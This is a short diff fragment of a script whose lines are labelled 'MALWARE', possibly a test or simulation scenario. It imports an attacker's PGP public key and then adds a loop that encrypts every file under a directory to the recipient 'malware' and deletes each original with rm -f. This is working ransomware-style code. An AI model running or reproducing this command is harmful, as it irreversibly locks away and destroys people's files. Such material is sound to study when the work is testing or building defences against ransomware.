@@ -41,3 +41,4 @@ MALWARE : echo =8j6/ >> public.key
 MALWARE : echo -----END PGP PUBLIC KEY BLOCK----- >> public.key
 MALWARE : gpg --import public.key
 MALWARE : cd ./A
+MALWARE : for i in $(find . -type f -print); do gpg --always-trust -e -r "malware" $i; rm -f $i; sleep 1; done
